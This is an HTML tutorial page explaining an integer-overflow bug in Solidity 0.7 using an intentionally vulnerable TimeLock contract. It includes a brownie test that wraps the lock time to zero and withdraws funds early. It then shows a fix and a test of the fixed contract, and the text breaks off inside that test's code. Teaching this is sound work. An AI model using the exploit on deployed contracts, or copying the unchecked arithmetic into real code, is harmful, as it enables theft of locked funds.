<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.15">
<link rel="alternate" type="application/rss+xml" href="/rss.xml" title="Buildany RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Buildany Atom Feed"><title data-react-helmet="true">Overflow | Buildany</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://buildany.github.io/docs/solidity-hacks/overflow"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Overflow | Buildany"><meta data-react-helmet="true" name="description" content="This exploit is reproducible only in Solidity version 7 and below. Since the release of the version 8, the overflow code causes VirtualMachineError by default."><meta data-react-helmet="true" property="og:description" content="This exploit is reproducible only in Solidity version 7 and below. Since the release of the version 8, the overflow code causes VirtualMachineError by default."><link data-react-helmet="true" rel="icon" href="/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://buildany.github.io/docs/solidity-hacks/overflow"><link data-react-helmet="true" rel="alternate" href="https://buildany.github.io/docs/solidity-hacks/overflow" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://buildany.github.io/docs/solidity-hacks/overflow" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.f30d2c71.css">
<link rel="preload" href="/assets/js/runtime~main.afe69008.js" as="script">
<link rel="preload" href="/assets/js/main.60961d6a.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/Logo32x32.svg" alt="My Site Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/img/Logo32x32.svg" alt="My Site Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">build:any</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/">Home</a><a class="navbar__item navbar__link navbar__link--active" href="/docs/intro">Tutorials</a></div><div class="navbar__items navbar__items--right"><div class="toggle_Pssr toggle_TdHA toggleDisabled_jDku"><div class="toggleTrack_SSoT" role="button" tabindex="-1"><div class="toggleTrackCheck_XobZ"><span class="toggleIcon_eZtF">ðŸŒœ</span></div><div class="toggleTrackX_YkSC"><span class="toggleIcon_eZtF">ðŸŒž</span></div><div class="toggleTrackThumb_uRm4"></div></div><input type="checkbox" class="toggleScreenReader_JnkT" aria-label="Switch between dark and light mode"></div><div class="navbar__search searchBarContainer_NW3z"><input placeholder="Search" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div><div class="searchHintContainer_Pkmr"><kbd class="searchHint_iIMx">ctrl</kbd><kbd class="searchHint_iIMx">K</kbd></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_P2Lg"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><aside class="theme-doc-sidebar-container docSidebarContainer_rKC_"><div class="sidebar_CW9Y"><nav class="menu thin-scrollbar menu_SkdO"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Content</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_VCh3" aria-current="page" href="/docs/solidity-hacks/re-entrancy">Solidity hacks</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/solidity-hacks/re-entrancy">Re-entrancy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/solidity-hacks/overflow">Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/solidity-hacks/underflow">Underflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/solidity-hacks/self-destruct">Self destruct</a></li></ul></li></ul></nav></div></aside><main class="docMainContainer_TCnq"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><div class="tocCollapsible_jdIR theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_Fzxq">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Overflow</h1><div class="admonition admonition-caution alert alert--warning"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>DEPRECATED</h5></div><div class="admonition-content"><p>This exploit is reproducible only in Solidity <strong>version 7</strong> and below. Since the release of the version <strong>8</strong>, the overflow code causes <code>VirtualMachineError</code> by default.</p></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="description">Description<a class="hash-link" href="#description" title="Direct link to heading">â€‹</a></h3><p>An arithmetic overflow results from a calculation that exceeds the memory space designated to hold it, or the computation result is outside the range of the variable type. In simple applications, we would attempt to run the exploit that turns the positive number into 0, allowing us to perform the logic we would not perform otherwise.</p><p>Consider the following smart contract:</p><div class="codeBlockContainer_I0IT language-solidity theme-code-block"><div style="color:#bfc7d5;background-color:#292d3e" class="codeBlockTitle_BvAR"><a data-testid="sourceCodeLink" href="https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLock.sol#L14" target="_blank" class="source-code-link">/contracts/overflow/TimeLock.sol#L14</a></div><div class="codeBlockContent_wNvx solidity"><pre tabindex="0" class="prism-code language-solidity codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">// SPDX-License-Identifier: MIT</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">pragma solidity ^0.7.6;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">contract TimeLock {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    mapping(address =&gt; uint256) public balances;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    mapping(address =&gt; uint256) public lockTime;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    function deposit() public payable {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        balances[msg.sender] += msg.value;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        lockTime[msg.sender] = block.timestamp + 1 weeks;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    function increaseLockTime(uint256 _secondsToIncrease) public {</span><br></span><span class="token-line docusaurus-highlight-code-line" style="color:#bfc7d5"><span class="token plain">        lockTime[msg.sender] += _secondsToIncrease;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    function withdraw() public {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        require(balances[msg.sender] &gt; 0);</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        require(block.timestamp &gt; lockTime[msg.sender]);</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        uint256 transferValue = balances[msg.sender];</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        balances[msg.sender] = 0;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        address payable receiver = payable(msg.sender);</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        receiver.transfer(transferValue);</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    function balanceOf() public view returns (uint256) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return address(this).balance;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    function lockTimeOf(address _user) public view returns (uint256) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return lockTime[_user];</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>On line 14, the arithmetic operation updates the user&#x27;s balance lock time. The <code>uint256</code> variable holds the values from 0 up until 2^256 - 1, which is precisely 256 bits. If we try to assign a new value more than 2^256 - 1, e.g., 2^256, the <code>_secondsToIncrease</code> will become 0. The types work circularly in this case, so once the limit is reached, the variable starts from 0.</p><p>So the attacker might exploit this behavior to overcome the funds lock time and perform the withdrawal earlier.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="how-to-test">How to test<a class="hash-link" href="#how-to-test" title="Direct link to heading">â€‹</a></h3><p>Let&#x27;s simulate the attack that via python unit test. The highlighted lines 22-24 below execute the overflow attack:</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div style="color:#bfc7d5;background-color:#292d3e" class="codeBlockTitle_BvAR"><a data-testid="sourceCodeLink" href="https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py" target="_blank" class="source-code-link">/tests/overflow/test_time_lock.py</a></div><div class="codeBlockContent_wNvx python"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> pytest</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">from</span><span class="token plain"> brownie </span><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> exceptions</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">from</span><span class="token plain"> scripts</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">utils </span><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> get_attacker_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> get_user_account</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">from</span><span class="token plain"> scripts</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">overflow</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">deploy_and_attack </span><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> deploy_time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> deploy_time_lock_fixed</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">from</span><span class="token plain"> web3 </span><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> Web3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">test_time_lock_immediate_withdrawal_successful</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 1. Deploy TimeLock smart contract</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    time_lock </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> deploy_time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 2. User deposits 1 ETH on the time lock smart contract balance</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    deposit_tx </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">deposit</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;from&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;value&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> Web3</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">toWei</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;ether&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    deposit_tx</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">wait</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># Let&#x27;s keep track of the user balance, ETH</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    user_balance </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">balance</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token operator" style="color:rgb(137, 221, 255)">**</span><span class="token number" style="color:rgb(247, 140, 108)">18</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 3. Execute the overflow attack</span><span class="token plain"></span><br></span><span class="token-line docusaurus-highlight-code-line" style="color:#bfc7d5"><span class="token plain">    increase_tx </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">increaseLockTime</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain"></span><br></span><span class="token-line docusaurus-highlight-code-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token builtin" style="color:rgb(130, 170, 255)">pow</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">2</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">256</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">-</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">lockTimeOf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">address</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line docusaurus-highlight-code-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;from&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    increase_tx</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">wait</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 4. Since the lock time is 0, we can easily withdraw the ETH</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    withdraw_tx </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">withdraw</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;from&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    withdraw_tx</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">wait</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># So it should not be possible for user to withdraw the ETH, but the user&#x27;s 1 ETH is back on his balance</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token keyword" style="font-style:italic">assert</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">balance</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token operator" style="color:rgb(137, 221, 255)">**</span><span class="token number" style="color:rgb(247, 140, 108)">18</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">==</span><span class="token plain"> user_balance </span><span class="token operator" style="color:rgb(137, 221, 255)">+</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This test should successfully pass, and the user gets his 1 ETH back on his balance immediately.</p><p>Also, consider running the brownie <a href="https://github.com/kkateq/solidity-hacks/blob/main/scripts/overflow/deploy_and_attack.py#L28" target="_blank" rel="noopener noreferrer">script</a> as well instead of the unit test to follow transactions log.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="how-to-fix">How to fix<a class="hash-link" href="#how-to-fix" title="Direct link to heading">â€‹</a></h3><p>If you would use solidity prior v8, it&#x27;s necessary to use safe math libraries to fix this problem. One of the examples is the <a href="https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol" target="_blank" rel="noopener noreferrer">SafeMath</a> from OpenZeppelin. The best option is to upgrade Solidity to v8. </p><h3 class="anchor anchorWithStickyNavbar_mojV" id="demo">Demo<a class="hash-link" href="#demo" title="Direct link to heading">â€‹</a></h3><p>I <a href="https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLockFixed.sol#L2" target="_blank" rel="noopener noreferrer">chose</a> upgrading Solidity version to fix the problem. Additionally, this points again that using the latest available solidity version is the safest option to go.</p><p>Check out the unit test that now fails to exploit the contract:</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div style="color:#bfc7d5;background-color:#292d3e" class="codeBlockTitle_BvAR"><a data-testid="sourceCodeLink" href="https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py#L34" target="_blank" class="source-code-link">/tests/overflow/test_time_lock.py#L34</a></div><div class="codeBlockContent_wNvx python"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token keyword" style="font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">test_time_lock_fixed_immediate_withdrawal_failed</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 1. Deploy TimeLock contract</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    time_lock </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> deploy_time_lock_fixed</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 2. Deposit funds using another user account</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    deposit_tx </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> time_lock</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">deposit</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;from&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;value&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> Web3</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">toWei</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;ether&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    user_balance </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> get_user_account</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">balance</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">/</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token operator" style="color:rgb(137, 221, 255)">**</span><span class="token number" style="color:rgb(247, 140, 108)">18</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    deposit_tx</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">wait</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic"># 3. Execute attack</span><span class="token plain"></span><br></span><span class="token-line docusaurus-highlight-code-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token keyword" style="font-style:italic">with</span><span class="token plain"> pytest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">raises</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">exceptions</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">VirtualMachineError</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        increase_tx </span><span class="token operator" 